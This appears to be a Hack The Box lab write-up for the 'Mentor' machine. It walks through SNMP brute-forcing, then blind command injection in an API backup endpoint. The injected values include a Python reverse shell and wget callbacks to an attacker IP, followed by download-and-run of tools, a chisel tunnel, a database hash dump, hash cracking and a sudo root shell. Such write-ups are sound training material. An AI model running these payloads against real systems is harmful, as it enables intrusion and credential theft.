# Mentor (HTB)

> Platform: Hack The Box  
> OS: Linux  
> Difficulty: Medium  
> Result: root

---

## Attack Chain

```text
Reconnaissance
├── nmap -p- --min-rate 5000 → 22 (SSH), 80 (Apache)
├── UDP scan → 161 (SNMP)
└── /etc/hosts: 10.129.115.144 mentorquotes.htb api.mentorquotes.htb

Foothold (SNMP + API)
├── ffuf (Host: FUZZ.mentorquotes.htb) → api.mentorquotes.htb
├── snmpbrute.py → community string "internal"
├── snmpwalk -v2c -c internal → /usr/local/bin/login.py <PASSWORD>
├── API /auth/signup + /auth/login → n3xu6 JWT
├── API /auth/login (james) → james JWT
└── /admin/backup (POST) → Blind RCE via path parameter

Lateral Movement (Container escape)
├── Python reverse shell (pty.spawn) → uid=0(root) in Alpine container
├── .dockerenv detected
├── wget static nmap → /tmp/nmap
├── /tmp/nmap -sn 172.22.0.0/24 → docker_web_1 (172.22.0.2), docker_postgres_1 (172.22.0.4)
├── chisel tunnel → R:127.0.0.1:8002:172.22.0.4:5432
├── psql -h 127.0.0.1 -p 8002 -U postgres → mentorquotes_db
├── SELECT * FROM users; → service_acc MD5 hash
└── hashcat -m 0 → <PASSWORD>

User Flag
├── ssh svc@mentor.htb (password <PASSWORD>)
└── cat /home/svc/user.txt → <USER_FLAG>

Privilege Escalation
├── cat /etc/snmp/snmpd.conf → createUser bootstrap MD5 <PASSWORD> DES
├── su james (password <PASSWORD>)
├── sudo -l → (ALL) /bin/sh
└── sudo /bin/sh → root
```

> [!NOTE]
> All flags, passwords, hashes, and session tokens have been masked for ethical reasons.

---

## Machine Briefing

Mentor is a Medium Linux machine featuring an SNMP service with a weak community string, an API with a blind command injection vulnerability, and a PostgreSQL container accessible via a Docker network. The path involves pivoting through multiple users and containers before reaching root via a misconfigured sudo rule.

---

## Reconnaissance

### Port Scan

```bash
nmap -p- --min-rate 5000 -T4 -Pn -n 10.129.115.144
```

| Port | Service | Version |
|------|---------|---------|
| 22   | SSH     | OpenSSH 8.9p1 Ubuntu 3 |
| 80   | HTTP    | Apache httpd 2.4.52 |

```bash
echo "10.129.115.144 mentorquotes.htb api.mentorquotes.htb" | sudo tee -a /etc/hosts
```

### vHost Enumeration

```bash
ffuf -u http://10.129.115.144 -H "Host: FUZZ.mentorquotes.htb" -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -mc 200,404 -fs 0
```

Result: `api` (Status: 404, Size: 22).

---

## Foothold (SNMP + API)

No CVE (custom vulnerability) - the SNMP community string leaks API credentials, and the API accepts unsanitized input that reaches a shell (blind RCE).

### SNMP Enumeration

```bash
sudo nmap -sU -F -Pn -n 10.129.115.144
```

| Port | Service |
|------|---------|
| 161  | SNMP    |

The default `public` community string gives no useful information. Brute-force to find `internal`:

```bash
python3 snmpbrute.py -t 10.129.115.144 -f /usr/share/seclists/Discovery/SNMP/common-snmp-community-strings.txt
```

Result: `internal` (v2c)(RO).

Extract process arguments:

```bash
snmpwalk -v2c -c internal 10.129.115.144 .1.3.6.1.2.1.25.4.2.1.5 | grep login.py
```

```text
iso.3.6.1.2.1.25.4.2.1.5.2078 = STRING: "/usr/local/bin/login.py <PASSWORD>"
```

### API Signup / Login

```bash
curl -s -X POST http://api.mentorquotes.htb/auth/signup -H 'Content-Type: application/json' -d '{"email": "n3xu6@mentor.htb", "username": "n3xu6", "password": "password123"}'
curl -s -X POST http://api.mentorquotes.htb/auth/login -H 'Content-Type: application/json' -d '{"email": "n3xu6@mentor.htb", "username": "n3xu6", "password": "password123"}'
```

The token does not have admin access:

```bash
curl -s http://api.mentorquotes.htb/admin/ -H 'Authorization: <JWT_TOKEN>'
```

```json
{"detail":"Only admin users can access this resource"}
```

Login as `james` with the password found via SNMP:

```bash
curl -s -X POST http://api.mentorquotes.htb/auth/login -H 'Content-Type: application/json' -d '{"email": "james@mentorquotes.htb", "username": "james", "password": "<PASSWORD>"}'
```

### Blind RCE

Check the `/admin/backup` endpoint:

```bash
curl -i -s http://api.mentorquotes.htb/admin/backup -H 'Authorization: <JWT_TOKEN>'
```

```text
HTTP/1.1 405 Method Not Allowed
{"detail":"Method Not Allowed"}
```

Test POST with empty JSON:

```bash
curl -s -X POST http://api.mentorquotes.htb/admin/backup -H 'Authorization: <JWT_TOKEN>' -H 'Content-Type: application/json' -d '{}'
```

```json
{"detail":[{"loc":["body","path"],"msg":"field required","type":"value_error.missing"}]}
```

Inject a `wget` command to confirm blind execution:

```bash
curl -s -X POST http://api.mentorquotes.htb/admin/backup -H 'Authorization: <JWT_TOKEN>' -H 'Content-Type: application/json' -d '{"path": "test; wget http://10.10.15.20:8000/test"}'
```

The server adds `/app_backkup.tar` to the end of the command, so the request is `GET /test/app_backkup.tar`. This confirms execution.

### Reverse Shell

Since `/bin/bash` and `nc -e` are not available in the Alpine container, use a Python reverse shell:

```bash
curl -s -X POST http://api.mentorquotes.htb/admin/backup -H 'Authorization: <JWT_TOKEN>' -H 'Content-Type: application/json' -d '{"path": "test; python3 -c \"import socket,os,pty;s=socket.socket();s.connect((\u002710.10.15.20\u0027,4444));[os.dup2(s.fileno(),f) for f in (0,1,2)];pty.spawn(\u0027/bin/sh\u0027)\"; #"}'
```

> [!IMPORTANT]
> OSCP report: take a screenshot of this step (command + output + timestamp).

Shell as `root` in an Alpine Docker container.

```bash
id
```

```text
uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel),11(floppy),20(dialout),26(tape),27(video)
```

---

## Lateral Movement (Container escape)

Check for Docker environment:

```bash
ls -la /
```

```text
-rwxr-xr-x    1 root     root             0 Oct 24 11:40 .dockerenv
```

Download static `nmap` and scan the internal network:

```bash
wget http://10.10.15.20:8000/nmap -O /tmp/nmap
chmod +x /tmp/nmap
/tmp/nmap -sn 172.22.0.0/24
```

```text
Nmap scan report for docker_web_1.docker_vpcbr (172.22.0.2)
Nmap scan report for docker_postgres_1.docker_vpcbr (172.22.0.4)
```

Scan for PostgreSQL:

```bash
/tmp/nmap -p 5432 172.22.0.0/24
```

```text
PORT     STATE SERVICE
5432/tcp open  postgresql
```

Download `chisel` and create a tunnel:

```bash
wget http://10.10.15.20:8000/chisel -O /tmp/chisel
chmod +x /tmp/chisel
```

Start server on Kali:

```bash
./chisel server -p 8001 --reverse
```

Connect from the container:

```bash
/tmp/chisel client 10.10.15.20:8001 R:127.0.0.1:8002:172.22.0.4:5432
```

### PostgreSQL Access

Connect to the database using default credentials:

```bash
psql -h 127.0.0.1 -p 8002 -U postgres
```

Password: `postgres`.

List databases:

```sql
\l
```

```text
mentorquotes_db
```

Connect and dump users:

```sql
\c mentorquotes_db
SELECT * FROM users;
```

```text
 id |         email          |  username   |             password             
----+------------------------+-------------+----------------------------------
  1 | james@mentorquotes.htb | james       | <MD5_HASH>
  2 | svc@mentorquotes.htb   | service_acc | <MD5_HASH>
```

Crack the MD5 hash for `service_acc`:

```bash
echo "<MD5_HASH>" > svc.hash
hashcat -m 0 svc.hash /usr/share/wordlists/rockyou.txt
```

```text
<MD5_HASH>:<PASSWORD>
```

### User Flag

Log in as `svc` via SSH (the username is not `service_acc`):

```bash
ssh svc@10.129.115.144
```

Password: `<PASSWORD>`.

```bash
cat /home/svc/user.txt
# <USER_FLAG>
```

> [!IMPORTANT]
> OSCP report: take a screenshot of this step (command + output + timestamp).

---

## Privilege Escalation

The SNMP configuration file contains a plaintext password for `james`:

```bash
cat /etc/snmp/snmpd.conf
```

```text
createUser bootstrap MD5 <PASSWORD> DES
```

Switch to `james`:

```bash
su james
```

Password: `<PASSWORD>`.

Check sudo privileges:

```bash
sudo -l
```

```text
User james may run the following commands on mentor:
    (ALL) /bin/sh
```

Get a root shell:

```bash
sudo /bin/sh
```

```bash
whoami
# root
cat /root/root.txt
# <ROOT_FLAG>
```

> [!IMPORTANT]
> OSCP report: take a screenshot of this step (command + output + timestamp).

---

## Flags

| Flag | Value                            |
|------|----------------------------------|
| User | <USER_FLAG> |
| Root | <ROOT_FLAG> |

---

## Key Takeaways

- **SNMP community strings** can expose sensitive process arguments. Always brute-force beyond the default `public`.
- **API Blind Command Injection** can be exploited using `;` and `#` to bypass appending suffixes.
- **Alpine containers** lack `/bin/bash` and `nc -e`; use Python for reverse shells.
- **Docker networks** require pivoting via `chisel` or similar tools.
- **PostgreSQL default credentials** are a critical finding.
- **Configuration files** (like `/etc/snmp/snmpd.conf`) often contain plaintext passwords for other users.
- **Sudo misconfigurations** like `(ALL) /bin/sh` are an instant root.